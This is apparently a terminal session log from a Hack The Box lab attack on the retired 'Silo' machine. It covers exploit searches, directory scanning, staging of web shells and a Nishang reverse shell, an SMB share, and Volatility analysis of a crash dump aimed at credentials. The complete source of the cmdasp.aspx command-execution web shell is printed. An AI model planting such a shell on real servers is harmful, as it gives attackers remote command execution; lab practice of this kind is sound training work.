@@ -1,0 +1,549 @@
+arjun@broly:~/Documents/HacktheBox/retired/silo$ searchsploit oracle tns                                          
+------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                           |  Path                                  
+                                                                         | (/usr/share/exploitdb/)                
+------------------------------------------------------------------------- ----------------------------------------
+Oracle 10gR2 - TNS Listener AUTH_SESSKEY Buffer Overflow (Metasploit)    | exploits/windows/remote/16342.rb       
+Oracle 8 Server - 'TNSLSNR80.EXE' Denial of Service                      | exploits/windows/dos/20779.pl          
+Oracle 8.1.x/9.0/9.2 - TNS Listener Service_CurLoad Remote Denial of Ser | exploits/multiple/dos/21782.txt        
+Oracle 8i - TNS Listener 'ARGUMENTS' Remote Buffer Overflow (Metasploit) | exploits/windows/remote/16340.rb       
+Oracle 8i - TNS Listener Buffer Overflow                                 | exploits/windows/remote/20980.c        
+Oracle 8i - TNS Listener Local Command Parameter Buffer Overflow         | exploits/linux/local/21362.c           
+Oracle 8i - TNS Listener SERVICE_NAME Buffer Overflow (Metasploit)       | exploits/windows/remote/16341.rb       
+Oracle 9i/10g Database - TNS Command Remote Denial of Service            | exploits/multiple/dos/33083.txt        
+Oracle RDBms 10.2.0.3/11.1.0.6 - TNS Listener (PoC)                      | exploits/windows/dos/8507.py           
+------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result       
+arjun@broly:~/Documents/HacktheBox/retired/silo$ /opt/gobuster/gobuster dir -u http://10.10.10.82 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,asp,aspx                                                          
+===============================================================                                                   
+Gobuster v3.0.1             
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                                                   
+===============================================================                                                   
+[+] Url:            http://10.10.10.82                   
+[+] Threads:        10      
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                  
+[+] Status codes:   200,204,301,302,307,401,403          
+[+] User Agent:     gobuster/3.0.1                       
+[+] Extensions:     txt,asp,aspx                         
+[+] Timeout:        10s     
+===============================================================                                                   
+2020/05/14 13:53:31 Starting gobuster                    
+===============================================================                                                   
+Progress: 104020 / 220561 (47.16%)^C1;5B^[[1;5B          
+[!] Keyboard interrupt detected, terminating.            
+===============================================================                                                   
+2020/05/14 15:24:22 Finished                             
+===============================================================                                                   
+arjun@broly:~/Documents/HacktheBox/retired/silo$ msfvenom -l payload | grep asp                                   
+arjun@broly:~/Documents/HacktheBox/retired/silo$ msfvenom -l payload | grep -i asp                                
+arjun@broly:~/Documents/HacktheBox/retired/silo$ msfvenom -l payload | grep -i iis                                
+arjun@broly:~/Documents/HacktheBox/retired/silo$ locate -r .aspx$                                                 
+/home/arjun/Documents/HacktheBox/retired/devel/ex.aspx   
+/opt/shell/powershell/nishang/Antak-WebShell/antak.aspx  
+/usr/share/davtest/backdoors/aspx_cmd.aspx               
+/usr/share/exploitdb/exploits/aspx                       
+/usr/share/laudanum/aspx    
+/usr/share/laudanum/aspx/shell.aspx                      
+/usr/share/nishang/Antak-WebShell/antak.aspx             
+/usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx           
+/usr/share/seclists/Web-Shells/laudanum-0.8/aspx         
+/usr/share/seclists/Web-Shells/laudanum-0.8/aspx/dns.aspx                                                         
+/usr/share/seclists/Web-Shells/laudanum-0.8/aspx/file.aspx                                                        
+/usr/share/seclists/Web-Shells/laudanum-0.8/aspx/shell.aspx                                                       
+/usr/share/webshells/aspx   
+/usr/share/webshells/aspx/cmdasp.aspx                    
+/usr/share/wordlists/SecLists/Web-Shells/FuzzDB/cmd.aspx 
+/usr/share/wordlists/SecLists/Web-Shells/laudanum-0.8/aspx                                                        
+/usr/share/wordlists/SecLists/Web-Shells/laudanum-0.8/aspx/dns.aspx                                               
+/usr/share/wordlists/SecLists/Web-Shells/laudanum-0.8/aspx/file.aspx                                              
+/usr/share/wordlists/SecLists/Web-Shells/laudanum-0.8/aspx/shell.aspx                                             
+arjun@broly:~/Documents/HacktheBox/retired/silo$ cp /usr/share/webshells/aspx/cmdasp.aspx .                       
+arjun@broly:~/Documents/HacktheBox/retired/silo$ vim cmdasp.aspx                                                  
+arjun@broly:~/Documents/HacktheBox/retired/silo$ cp /opt/shell/powershell/nishang/Antak-WebShell/antak.aspx .     
+arjun@broly:~/Documents/HacktheBox/retired/silo$ vim antak.aspx                                                   
+arjun@broly:~/Documents/HacktheBox/retired/silo$ wc -c antak.aspx                                                 
+10444 antak.aspx            
+arjun@broly:~/Documents/HacktheBox/retired/silo$ cp /usr/share/webshells/aspx/cmdasp.aspx .                       
+arjun@broly:~/Documents/HacktheBox/retired/silo$ vim cmdasp.aspx                                                  
+arjun@broly:~/Documents/HacktheBox/retired/silo$ wc -c cmdasp.aspx                                                
+1013 cmdasp.aspx            
+arjun@broly:~/Documents/HacktheBox/retired/silo$ sed -z 's/\n//g'                                                 
+^C                          
+arjun@broly:~/Documents/HacktheBox/retired/silo$ sed -z 's/\n//g' cmdasp.aspx                                     
+<%@ Page Language="C#" Debug="true" Trace="false" %><%@ Import Namespace="System.Diagnostics" %><%@ Import Namespace="System.IO" %><script Language="c#" runat="server">void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = "cmd.exe";psi.Arguments = "/c "+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write("<pre>");Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write("</pre>");}</script><HTML><body ><form id="cmd" method="post" runat="server"><asp:TextBox id="txtArg"  runat="server" Width="250px"></asp:TextBox><asp:Button id="testing"  Text="excute" OnClick="cmdExe_Click"></asp:Button><asp:Label id="lblText" runat="server">Command:</asp:Label></form></body></HTML>arjun@broly:~/Documents/HacktheBox/retired/silo$ sed -z 's/\n//g' cmdasp.aspx | wc -c                                                                                                                 
+977                         
+arjun@broly:~/Documents/HacktheBox/retired/silo$         
+arjun@broly:~/Documents/HacktheBox/retired/silo$ vim cmdasp.aspx                                                  
+arjun@broly:~/Documents/HacktheBox/retired/silo$ sed -z 's/\n//g' cmdasp.aspx | wc -c                             
+992                         
+arjun@broly:~/Documents/HacktheBox/retired/silo$ sed -z 's/\n//g' cmdasp.aspx                                     
+<%@ Page Language="C#" Debug="true" Trace="false" %><%@ Import Namespace="System.Diagnostics" %><%@ Import Namespace="System.IO" %><script Language="c#" runat="server">void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = "cmd.exe";psi.Arguments = "/c "+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write("<pre>");Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write("</pre>");}</script><HTML><body ><form id="cmd" method="post" runat="server"><asp:TextBox id="txtArg"  runat="server" Width="250px"></asp:TextBox><asp:Button id="testing"  runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button><asp:Label id="lblText" runat="server">Command:</asp:Label></form></body></HTML>arjun@broly:~/Documents/HacktheBox/retired/silo$ cp /opt/shell/powershell/nishang/Shells/Invoke-                                                                                       
+Invoke-ConPtyShell.ps1               Invoke-PowerShellIcmp.ps1            Invoke-PowerShellUdp.ps1                
+Invoke-JSRatRegsvr.ps1               Invoke-PowerShellTcpOneLineBind.ps1  Invoke-PowerShellWmi.ps1                
+Invoke-JSRatRundll.ps1               Invoke-PowerShellTcpOneLine.ps1      Invoke-PsGcatAgent.ps1                  
+Invoke-PoshRatHttp.ps1               Invoke-PowerShellTcp.ps1             Invoke-PsGcat.ps1                       
+Invoke-PoshRatHttps.ps1              Invoke-PowerShellUdpOneLine.ps1                                              
+arjun@broly:~/Documents/HacktheBox/retired/silo$ cp /opt/shell/powershell/nishang/Shells/Invoke-PowerShellTcp.ps1 .  
+arjun@broly:~/Documents/HacktheBox/retired/silo$ vim Invoke-PowerShellTcp.ps1                                     
+arjun@broly:~/Documents/HacktheBox/retired/silo$ vim Invoke-PowerShellTcp.ps1                                     
+arjun@broly:~/Documents/HacktheBox/retired/silo$ impacket-smbserver pub `pwd`                                     
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation 
+
+Traceback (most recent call last):                       
+  File "/usr/share/doc/python3-impacket/examples/smbserver.py", line 64, in <module>                              
+    server = smbserver.SimpleSMBServer(listenAddress=options.interface_address, listenPort=int(options.port))     
+  File "/usr/lib/python3/dist-packages/impacket/smbserver.py", line 4621, in __init__                             
+    self.__server = SMBSERVER((listenAddress,listenPort), config_parser = self.__smbConfig)                       
+  File "/usr/lib/python3/dist-packages/impacket/smbserver.py", line 3747, in __init__                             
+    socketserver.TCPServer.__init__(self, server_address, handler_class)                                          
+  File "/usr/lib/python3.8/socketserver.py", line 452, in __init__                                                
+    self.server_bind()      
+  File "/usr/lib/python3.8/socketserver.py", line 466, in server_bind                                             
+    self.socket.bind(self.server_address)                
+PermissionError: [Errno 13] Permission denied            
+arjun@broly:~/Documents/HacktheBox/retired/silo$ sudo impacket-smbserver pub `pwd`                                
+[sudo] password for arjun:  
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation 
+
+[*] Config file parsed      
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0                                            
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0                                            
+[*] Config file parsed      
+[*] Config file parsed      
+[*] Config file parsed      
+[*] Incoming connection (10.10.10.82,49168)              
+[*] AUTHENTICATE_MESSAGE (\,SILO)                        
+[*] User SILO\ authenticated successfully                
+[*] :::00::4141414141414141 
+[*] Disconnecting Share(1:IPC$)                          
+^CTraceback (most recent call last):                     
+  File "/usr/share/doc/python3-impacket/examples/smbserver.py", line 98, in <module>                              
+    server.start()          
+  File "/usr/lib/python3/dist-packages/impacket/smbserver.py", line 4638, in start                                
+    self.__server.serve_forever()                        
+  File "/usr/lib/python3.8/socketserver.py", line 232, in serve_forever                                           
+    ready = selector.select(poll_interval)               
+  File "/usr/lib/python3.8/selectors.py", line 415, in select                                                     
+    fd_event_list = self._selector.poll(timeout)         
+KeyboardInterrupt           
+^CException ignored in: <module 'threading' from '/usr/lib/python3.8/threading.py'>                               
+Traceback (most recent call last):                       
+  File "/usr/lib/python3.8/threading.py", line 1388, in _shutdown                                                 
+    lock.acquire()          
+KeyboardInterrupt:          
+
+arjun@broly:~/Documents/HacktheBox/retired/silo$ ls      
+ antak.aspx    Invoke-PowerShellTcp.ps1   notes.ctb    notes.ctb~~   'Oracle issue.txt'                           
+ cmdasp.aspx   nmap                       notes.ctb~   notes.ctb~~~                                               
+arjun@broly:~/Documents/HacktheBox/retired/silo$ vim Oracle\ issue.txt                                            
+arjun@broly:~/Documents/HacktheBox/retired/silo$ unzip   
+nmap/                     SILO-20180105-221806.zip       
+arjun@broly:~/Documents/HacktheBox/retired/silo$ unzip   
+nmap/                     SILO-20180105-221806.zip       
+arjun@broly:~/Documents/HacktheBox/retired/silo$ unzip SILO-20180105-221806.zip                                   
+Archive:  SILO-20180105-221806.zip                       
+  inflating: SILO-20180105-221806.dmp                    
+arjun@broly:~/Documents/HacktheBox/retired/silo$ vim SILO-20180105-221806.                                        
+arjun@broly:~/Documents/HacktheBox/retired/silo$ vim SILO-20180105-221806.dmp                                     
+arjun@broly:~/Documents/HacktheBox/retired/silo$ file SILO-20180105-221806.dmp                                    
+SILO-20180105-221806.dmp: MS Windows 64bit crash dump, full dump, 261996 pages                                    
+arjun@broly:~/Documents/HacktheBox/retired/silo$ vim Oracle\ issue.txt                                            
+arjun@broly:~/Documents/HacktheBox/retired/silo$ file SILO-20180105-221806.dmp                                    
+SILO-20180105-221806.dmp: MS Windows 64bit crash dump, full dump, 261996 pages                                    
+arjun@broly:~/Documents/HacktheBox/retired/silo$ wget https://raw.githubusercontent.com/volatilityfoundation/community/master/FrancescoPicasso/mimikatz.py                                                                                 
+--2020-05-14 16:02:05--  https://raw.githubusercontent.com/volatilityfoundation/community/master/FrancescoPicasso/mimikatz.py                                                                                                              
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.48.133                                 
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.48.133|:443... connected.             
+HTTP request sent, awaiting response... 200 OK           
+Length: 20672 (20K) [text/plain]                         
+Saving to: ‘mimikatz.py’    
+
+mimikatz.py                  100%[============================================>]  20.19K  --.-KB/s    in 0.009s   
+
+2020-05-14 16:02:05 (2.26 MB/s) - ‘mimikatz.py’ saved [20672/20672]                                               
+
+arjun@broly:~/Documents/HacktheBox/retired/silo$ python mimikatz.py                                               
+Traceback (most recent call last):                       
+  File "mimikatz.py", line 29, in <module>               
+    import construct        
+ImportError: No module named construct                   
+arjun@broly:~/Documents/HacktheBox/retired/silo$ sudo python -m pip install construct                             
+/usr/share/python-wheels/pkg_resources-0.0.0-py3-none-any.whl/pkg_resources/py2_warn.py:21: UserWarning: Setuptools will stop working on Python 2                                                                                          
+************************************************************                                                      
+You are running Setuptools on Python 2, which is no longer                                                        
+supported and               
+>>> SETUPTOOLS WILL STOP WORKING <<<                     
+in a subsequent release (no sooner than 2020-04-20).     
+Please ensure you are installing                         
+Setuptools using pip 9.x or later or pin to `setuptools<45`                                                       
+in your environment.        
+If you have done those things and are still encountering 
+this message, please follow up at                        
+https://bit.ly/setuptools-py2-warning.                   
+************************************************************                                                      
+DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. A future version of pip will drop support for Python 2.7. More details about Python 2 support in pip, can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support
+Collecting construct        
+  Downloading construct-2.10.54.tar.gz (55 kB)           
+     |████████████████████████████████| 55 kB 1.9 MB/s   
+Building wheels for collected packages: construct        
+  Building wheel for construct (setup.py) ... done       
+  Created wheel for construct: filename=construct-2.10.54-py2-none-any.whl size=57400 sha256=2033a18bfbb95bc7a1ff20dee9142137f33063ef131ebd374c0d6a2eb4ffc115                                                                              
+  Stored in directory: /root/.cache/pip/wheels/af/8e/c5/686cebf634111570b5dde5b340fcff57968f6c57e9d1024a0f        
+Successfully built construct                             
+Installing collected packages: construct                 
+Successfully installed construct-2.10.54                 
+arjun@broly:~/Documents/HacktheBox/retired/silo$ python mimikatz.py                                               
+Traceback (most recent call last):                       
+  File "mimikatz.py", line 171, in <module>              
+    class LsaDecryptor():   
+  File "mimikatz.py", line 182, in LsaDecryptor          
+    construct.ULInt32('cbSecret'),                       
+AttributeError: 'module' object has no attribute 'ULInt32'                                                        
+arjun@broly:~/Documents/HacktheBox/retired/silo$ python mimikatz.py                                               
+Traceback (most recent call last):                       
+  File "mimikatz.py", line 171, in <module>              
+    class LsaDecryptor():   
+  File "mimikatz.py", line 182, in LsaDecryptor          
+    construct.ULInt32('cbSecret'),                       
+AttributeError: 'module' object has no attribute 'ULInt32'                                                        
+arjun@broly:~/Documents/HacktheBox/retired/silo$ sudo apt volatility                                              
+E: Invalid operation volatility                          
+arjun@broly:~/Documents/HacktheBox/retired/silo$ sudo apt install volatility                                      
+Reading package lists... Done                            
+Building dependency tree                                 
+Reading state information... Done                        
+volatility is already the newest version (2.6.1-1).      
+volatility set to manually installed.                    
+0 upgraded, 0 newly installed, 0 to remove and 648 not upgraded.                                                  
+arjun@broly:~/Documents/HacktheBox/retired/silo$ vol     
+volatility  volint      volname                          
+arjun@broly:~/Documents/HacktheBox/retired/silo$ volatility                                                       
+Volatility Foundation Volatility Framework 2.6           
+ERROR   : volatility.debug    : You must specify something to do (try -h)                                         
+arjun@broly:~/Documents/HacktheBox/retired/silo$ volatility -h                                                    
+Volatility Foundation Volatility Framework 2.6           
+Usage: Volatility - A memory forensics analysis platform.                                                         
+
+Options:                    
+  -h, --help            list all available options and their default values.                                      
+                        Default values may be set in the configuration file                                       
+                        (/etc/volatilityrc)              
+  --conf-file=/home/arjun/.volatilityrc                  
+                        User based configuration file    
+  -d, --debug           Debug volatility                 
+  --plugins=PLUGINS     Additional plugin directories to use (colon separated)                                    
+  --info                Print information about all registered objects                                            
+  --cache-directory=/home/arjun/.cache/volatility        
+                        Directory where cache files are stored                                                    
+  --cache               Use caching                      
+  --tz=TZ               Sets the (Olson) timezone for displaying timestamps                                       
+                        using pytz (if installed) or tzset                                                        
+  -f FILENAME, --filename=FILENAME                       
+                        Filename to use when opening an image                                                     
+  --profile=WinXPSP2x86     
+                        Name of the profile to load (use --info to see a list                                     
+                        of supported profiles)           
+  -l LOCATION, --location=LOCATION                       
+                        A URN location from which to load an address space                                        
+  -w, --write           Enable write support             
+  --dtb=DTB             DTB Address                      
+  --shift=SHIFT         Mac KASLR shift address          
+  --output=text         Output in this format (support is module specific, see                                    
+                        the Module Output Options below) 
+  --output-file=OUTPUT_FILE 
+                        Write output in this file        
+  -v, --verbose         Verbose information              
+  --physical_shift=PHYSICAL_SHIFT                        
+                        Linux kernel physical shift address                                                       
+  --virtual_shift=VIRTUAL_SHIFT                          
+                        Linux kernel virtual shift address                                                        
+  -g KDBG, --kdbg=KDBG  Specify a KDBG virtual address (Note: for 64-bit                                          
+                        Windows 8 and above this is the address of                                                
+                        KdCopyDataBlock)                 
+  --force               Force utilization of suspect profile                                                      
+  -k KPCR, --kpcr=KPCR  Specify a specific KPCR address  
+  --cookie=COOKIE       Specify the address of nt!ObHeaderCookie (valid for                                       
+                        Windows 10 only)                 
+
+        Supported Plugin Commands:                       
+
+                amcache         Print AmCache information
+                apihooks        Detect API hooks in process and kernel memory                                     
+                atoms           Print session and window station atom tables                                      
+                atomscan        Pool scanner for atom tables                                                      
+                auditpol        Prints out the Audit Policies from HKLM\SECURITY\Policy\PolAdtEv                  
+                bigpools        Dump the big page pools using BigPagePoolScanner                                  
+                bioskbd         Reads the keyboard buffer from Real Mode memory                                   
+                cachedump       Dumps cached domain hashes from memory                                            
+                callbacks       Print system-wide notification routines                                           
+                clipboard       Extract the contents of the windows clipboard                                     
+                cmdline         Display process command-line arguments                                            
+                cmdscan         Extract command history by scanning for _COMMAND_HISTORY                          
+                connections     Print list of open connections [Windows XP and 2003 Only]                         
+                connscan        Pool scanner for tcp connections                                                  
+                consoles        Extract command history by scanning for _CONSOLE_INFORMATION                      
+                crashinfo       Dump crash-dump information                                                       
+                deskscan        Poolscaner for tagDESKTOP (desktops)                                              
+                devicetree      Show device tree         
+                dlldump         Dump DLLs from a process address space                                            
+                dlllist         Print list of loaded dlls for each process                                        
+                driverirp       Driver IRP hook detection
+                drivermodule    Associate driver objects to kernel modules                                        
+                driverscan      Pool scanner for driver objects                                                   
+                dumpcerts       Dump RSA private and public SSL keys                                              
+                dumpfiles       Extract memory mapped and cached files                                            
+                dumpregistry    Dumps registry files out to disk                                                  
+                editbox         Displays information about Edit controls. (Listbox experimental.)                 
+                envars          Display process environment variables                                             
+                eventhooks      Print details on windows event hooks                                              
+                evtlogs         Extract Windows Event Logs (XP/2003 only)                                         
+                filescan        Pool scanner for file objects                                                     
+                gahti           Dump the USER handle type information                                             
+                gditimers       Print installed GDI timers and callbacks                                          
+                gdt             Display Global Descriptor Table                                                   
+                getservicesids  Get the names of services in the Registry and return Calculated SID               
+                getsids         Print the SIDs owning each process                                                
+                handles         Print list of open handles for each process                                       
+                hashdump        Dumps passwords hashes (LM/NTLM) from memory                                      
+                hibinfo         Dump hibernation file information                                                 
+                hivedump        Prints out a hive        
+                hivelist        Print list of registry hives.                                                     
+                hivescan        Pool scanner for registry hives                                                   
+                hpakextract     Extract physical memory from an HPAK file                                         
+                hpakinfo        Info on an HPAK file     
+                idt             Display Interrupt Descriptor Table                                                
+                iehistory       Reconstruct Internet Explorer cache / history                                     
+                imagecopy       Copies a physical address space out as a raw DD image                             
+                imageinfo       Identify information for the image                                                
+                impscan         Scan for calls to imported functions                                              
+                joblinks        Print process job link information                                                
+                kdbgscan        Search for and dump potential KDBG values                                         
+                kpcrscan        Search for and dump potential KPCR values                                         
+                ldrmodules      Detect unlinked DLLs     
+                lsadump         Dump (decrypted) LSA secrets from the registry                                    
+                machoinfo       Dump Mach-O file format information                                               
+                malfind         Find hidden and injected code                                                     
+                mbrparser       Scans for and parses potential Master Boot Records (MBRs)                         
+                memdump         Dump the addressable memory for a process                                         
+                memmap          Print the memory map     
+                messagehooks    List desktop and thread window message hooks                                      
+                mftparser       Scans for and parses potential MFT entries                                        
+                moddump         Dump a kernel driver to an executable file sample                                 
+                modscan         Pool scanner for kernel modules                                                   
+                modules         Print list of loaded modules                                                      
+                multiscan       Scan for various objects at once                                                  
+                mutantscan      Pool scanner for mutex objects                                                    
+                notepad         List currently displayed notepad text                                             
+                objtypescan     Scan for Windows object type objects                                              
+                patcher         Patches memory based on page scans                                                
+                poolpeek        Configurable pool scanner plugin                                                  
+                printkey        Print a registry key, and its subkeys and values                                  
+                privs           Display process privileges                                                        
+                procdump        Dump a process to an executable file sample                                       
+                pslist          Print all running processes by following the EPROCESS lists                       
+                psscan          Pool scanner for process objects                                                  
+                pstree          Print process list as a tree                                                      
+                psxview         Find hidden processes with various process listings                               
+                qemuinfo        Dump Qemu information    
+                raw2dmp         Converts a physical memory sample to a windbg crash dump                          
+                screenshot      Save a pseudo-screenshot based on GDI windows                                     
+                servicediff     List Windows services (ala Plugx)                                                 
+                sessions        List details on _MM_SESSION_SPACE (user logon sessions)                           
+                shellbags       Prints ShellBags info    
+                shimcache       Parses the Application Compatibility Shim Cache registry key                      
+                shutdowntime    Print ShutdownTime of machine from registry                                       
+                sockets         Print list of open sockets                                                        
+                sockscan        Pool scanner for tcp socket objects                                               
+                ssdt            Display SSDT entries     
+                strings         Match physical offsets to virtual addresses (may take a while, VERY verbose)      
+                svcscan         Scan for Windows services
+                symlinkscan     Pool scanner for symlink objects                                                  
+                thrdscan        Pool scanner for thread objects                                                   
+                threads         Investigate _ETHREAD and _KTHREADs                                                
+                timeliner       Creates a timeline from various artifacts in memory                               
+                timers          Print kernel timers and associated module DPCs                                    
+                truecryptmaster Recover TrueCrypt 7.1a Master Keys                                                
+                truecryptpassphrase     TrueCrypt Cached Passphrase Finder                                        
+                truecryptsummary        TrueCrypt Summary
+                unloadedmodules Print list of unloaded modules                                                    
+                userassist      Print userassist registry keys and information                                    
+                userhandles     Dump the USER handle tables                                                       
+                vaddump         Dumps out the vad sections to a file                                              
+                vadinfo         Dump the VAD info        
+                vadtree         Walk the VAD tree and display in tree format                                      
+                vadwalk         Walk the VAD tree        
+                vboxinfo        Dump virtualbox information                                                       
+                verinfo         Prints out the version information from PE images                                 
+                vmwareinfo      Dump VMware VMSS/VMSN information                                                 
+                volshell        Shell in the memory image
+                windows         Print Desktop Windows (verbose details)                                           
+                wintree         Print Z-Order Desktop Windows Tree                                                
+                wndscan         Pool scanner for window stations                                                  
+                yarascan        Scan process or kernel memory with Yara signatures                                
+arjun@broly:~/Documents/HacktheBox/retired/silo$ volatility -f SILO-20180105-221806.dmp imageinfo                 
+Volatility Foundation Volatility Framework 2.6           
+INFO    : volatility.debug    : Determining profile based on KDBG search...                                       
+WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow 
+WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow 
+WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow 
+WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow 
+WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow 
+WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow 
+WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow 
+WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow 
+WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow 
+WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow 
+WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow 
+WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow 
+WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow 
+WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow 
+WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow 
+WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow 
+WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow 
+WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow 
+          Suggested Profile(s) : Win8SP0x64, Win10x64_17134, Win81U1x64, Win10x64_10240_17770, Win2012R2x64_18340, Win10x64_14393, Win10x64, Win2016x64_14393, Win10x64_16299, Win2012R2x64, Win2012x64, Win8SP1x64_18340, Win10x64_10586, Win8SP1x64, Win10x64_15063 (Instantiated with Win10x64_15063)
+                     AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS)                                       
+                     AS Layer2 : WindowsCrashDumpSpace64 (Unnamed AS)                                             
+                     AS Layer3 : FileAddressSpace (/home/arjun/Documents/HacktheBox/retired/silo/SILO-20180105-221806.dmp)                                                                                                                 
+                      PAE type : No PAE                  
+                           DTB : 0x1a7000L               
+                          KDBG : 0xf80078520a30L         
+          Number of Processors : 2                       
+     Image Type (Service Pack) : 0                       
+                KPCR for CPU 0 : 0xfffff8007857b000L     
+                KPCR for CPU 1 : 0xffffd000207e8000L     
+             KUSER_SHARED_DATA : 0xfffff78000000000L     
+           Image date and time : 2018-01-05 22:18:07 UTC+0000                                                     
+     Image local date and time : 2018-01-05 22:18:07 +0000                                                        
+arjun@broly:~/Documents/HacktheBox/retired/silo$ volatility -f SILO-20180105-221806.dmp --profile Win2012R2x64 clipboard                                                                                                                   
+Volatility Foundation Volatility Framework 2.6           
+Session    WindowStation Format                         Handle Object             Data                                                                                                                                                     
+---------- ------------- ------------------ ------------------ ------------------ --------------------------------------------------                                                                                                       
+         1 WinSta0       0xc009L                       0x30197 0xfffff901401d8330                                                                                                                                                          
+         1 WinSta0       0x0L                              0xf ------------------                                                                                                                                                          
+         1 WinSta0       0x0L                              0x0 ------------------                                                                                                                                                          
+         1 ------------- ------------------            0x10199 0xfffff90144a5b380                                                                                                                                                          
+arjun@broly:~/Documents/HacktheBox/retired/silo$ volatility -f SILO-20180105-221806.dmp --profile Win2012R2x64 pstree
+Volatility Foundation Volatility Framework 2.6           
+Name                                                  Pid   PPid   Thds   Hnds Time                                  
+-------------------------------------------------- ------ ------ ------ ------ ----                                  
+ 0xffffe000034ac940:wininit.exe                       404    316      4      0 2018-01-05 22:17:16 UTC+0000          
+. 0xffffe00003550940:services.exe                     492    404     10      0 2018-01-05 22:17:16 UTC+0000          
+.. 0xffffe00003fe3940:svchost.exe                     832    492     20      0 2018-01-05 22:17:17 UTC+0000          
+.. 0xffffe00004fff080:VGAuthService.                 1324    492      3      0 2018-01-05 22:17:18 UTC+0000          
+.. 0xffffe000030a1080:dllhost.exe                    1432    492     21      0 2018-01-05 22:17:27 UTC+0000          
+.. 0xffffe00004e267c0:svchost.exe                     920    492     25      0 2018-01-05 22:17:17 UTC+0000          
+.. 0xffffe00003f68940:vmacthlp.exe                    708    492      2      0 2018-01-05 22:17:16 UTC+0000          
+.. 0xffffe000030b7940:dllhost.exe                    1600    492     17      0 2018-01-05 22:17:27 UTC+0000          
+.. 0xffffe00004f5c940:svchost.exe                    1052    492     11      0 2018-01-05 22:17:17 UTC+0000          
+.. 0xffffe00003fcc940:svchost.exe                     800    492     63      0 2018-01-05 22:17:17 UTC+0000          
+... 0xffffe000061637c0:taskhostex.exe                2368    800      7      0 2018-01-05 22:17:33 UTC+0000          
+.. 0xffffe0000608f780:vmtoolsd.exe                   1444    492      8      0 2018-01-05 22:17:18 UTC+0000          
+.. 0xffffe00004f84940:oracle.exe                     1088    492     30      0 2018-01-05 22:17:17 UTC+0000          
+.. 0xffffe00003f22500:svchost.exe                     560    492     15      0 2018-01-05 22:17:16 UTC+0000          
+... 0xffffe00003224540:WmiPrvSE.exe                  3056    560     19      0 2018-01-05 22:17:47 UTC+0000          
+... 0xffffe00003239940:WmiPrvSE.exe                  2340    560     10      0 2018-01-05 22:17:47 UTC+0000          
+... 0xffffe0000315f940:SppExtComObj.E                2312    560      5      0 2018-01-05 22:17:29 UTC+0000          
+... 0xffffe000030cd940:WmiPrvSE.exe                  1440    560     12      0 2018-01-05 22:17:27 UTC+0000          
+.. 0xffffe00004f2e940:spoolsv.exe                     308    492     13      0 2018-01-05 22:17:17 UTC+0000          
+.. 0xffffe00004fef940:TNSLSNR.EXE                    1208    492      5      0 2018-01-05 22:17:18 UTC+0000          
+.. 0xffffe00003117940:VSSVC.exe                      2228    492      7      0 2018-01-05 22:17:29 UTC+0000          
+.. 0xffffe000030cf940:msdtc.exe                      2052    492     13      0 2018-01-05 22:17:27 UTC+0000          
+.. 0xffffe00004e8d940:svchost.exe                     340    492     16      0 2018-01-05 22:17:17 UTC+0000          
+.. 0xffffe00003f39940:svchost.exe                     604    492     15      0 2018-01-05 22:17:16 UTC+0000          
